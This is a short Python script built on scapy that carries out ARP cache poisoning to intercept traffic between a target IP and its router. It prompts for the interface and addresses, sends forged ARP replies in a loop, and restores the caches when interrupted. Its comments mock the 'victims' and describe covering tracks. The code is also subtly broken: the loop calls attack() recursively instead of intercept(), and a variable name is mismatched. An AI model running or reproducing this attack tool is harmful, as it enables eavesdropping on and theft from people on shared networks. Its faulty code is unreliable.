from scapy.all import *
import sys
import os
import time

# Send an ARP request to snipe Physical MAC adresses
def resolve_mac_adress(IP):
    conf.verb = 0
    answer, unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout= 2, iface= wireless_interface_type, inter= 0.1)
    for send,recieve in answer:
        return rcv.sprintf(r"%Ether.src%")

def intercept(alice, bob):
    send(ARP(op=2, pdst= victim, psrc=gate, hwdst=bob))
    send(ARP(op=2, pdst= gate, psrc= victim, hwdst=alice))

# Re assign the target addresses so no one knows you just totally hacked them
def restore_ARP():
    print("\n Patching up victims...")
    victim_phys = resolve_mac_adress(victim)
    gate_phys = resolve_mac_adress(gate)
    send(ARP(op=2, pdst= gate, psrc=victim, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_phys, count= 7))
    send(ARP(op=2, pdst= victim, psrc=gate, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_phys, count= 7))
    print ("Stopping IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print ("Exiting Hacker Mode...")
    sys.exit(1)

# Totally snatch messages between two unsespecting scrubs
def attack():
    try:
        victim_phys = resolve_mac_adress(victim)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("Oops! Haha stinky! Uh oh! Stinky poopy! Haha!")
        sys.exit(1)
    try:
        gate_phys = resolve_mac_adress(gate)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("OwO OOps! Sowwy! Somefing made a fucky wucky!")
        sys.exit(1)
    print( "Hacking in progress... \n")
    print( "beep boop 010010101011100101010101001100101 \n")
    while 1:
        try:
            attack(gate_phys, victim_phys)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restore_ARP()
            break

# Get input from the hacker (you!)
try:
    wireless_interface_type = raw_input("Enter Network Interface Type: ")
    victim = raw_input("Enter Target IP Address: ")
    gate = raw_input("Enter Router IP Address:")
except KeyboardInterrupt:
    print ("\n Keyboard Interrupt!")
    print ("Shutting down...")
    sys.exit(1)

attack()

